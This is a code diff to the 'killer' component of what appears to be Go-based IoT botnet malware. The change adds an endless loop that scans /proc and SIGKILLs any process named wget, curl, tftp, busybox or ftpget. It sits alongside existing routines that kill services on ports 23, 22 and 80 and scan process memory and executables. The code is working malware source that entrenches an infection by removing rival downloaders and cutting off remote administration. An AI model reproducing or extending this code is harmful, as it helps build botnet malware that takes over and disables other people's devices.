@@ -11,6 +11,7 @@ import (
 	"os/exec"
 	"strconv"
 	"strings"
+	"sync"
 	"syscall"
 	"time"
 	"unicode"
@@ -259,6 +260,20 @@ func KillerInit() {
 
 	DecodeKillerData()
 
+	var wg sync.WaitGroup
+	go func() {
+		for {
+
+			wg.Add(5)
+			go KillByName("wget", &wg)
+			go KillByName("curl", &wg)
+			go KillByName("tftp", &wg)
+			go KillByName("busybox", &wg)
+			go KillByName("ftpget", &wg)
+			wg.Wait()
+			time.Sleep(100 * time.Millisecond)
+		}
+	}()
 	KillByPort(23)
 	KillByPort(22)
 	KillByPort(80)
@@ -274,6 +289,7 @@ func KillerInit() {
 		cmdLineKiller()
 		mapsKiller()
 		scanExe()
+		time.Sleep(100 * time.Millisecond)
 	}
 }
 
@@ -642,6 +658,58 @@ func scanExe() {
 
 		}
 	}
+
+}
+
+func KillByName(name string, wg *sync.WaitGroup) {
+
+	defer methods.Catch()
+
+	processes, err := os.ReadDir("/proc")
+	if err != nil {
+		if config.DEBUG {
+			fmt.Println("[killer] Can't read /proc")
+		}
+		return
+	}
+
+	for _, i := range processes {
+		if !i.IsDir() && !isNumeric(i.Name()) {
+			continue
+		}
+
+		pid, err := strconv.Atoi(i.Name())
+		if err != nil {
+			continue
+		}
+
+		if pid == syscall.Getpid() || pid == syscall.Getppid() {
+			continue
+		}
+
+		if pid < config.MIN_KILLER_PID || pid > config.MAX_KILLER_PID {
+			continue
+		}
+
+		comm, err := os.ReadFile("/proc/" + i.Name() + "/comm")
+		if err != nil {
+			continue
+		}
+
+		if strings.HasPrefix(string(comm), name) {
+			err := syscall.Kill(pid, 9)
+			if err != nil {
+				if config.DEBUG {
+					fmt.Printf("[killer] Can't kill %d. Reason: %v\n", pid, err)
+				}
+				continue
+			}
+			if config.DEBUG {
+				fmt.Printf("[killer] Killed pid ( %d ). Name (%s)\n", pid, name)
+			}
+		}
+	}
+	wg.Done()
 
 }
 
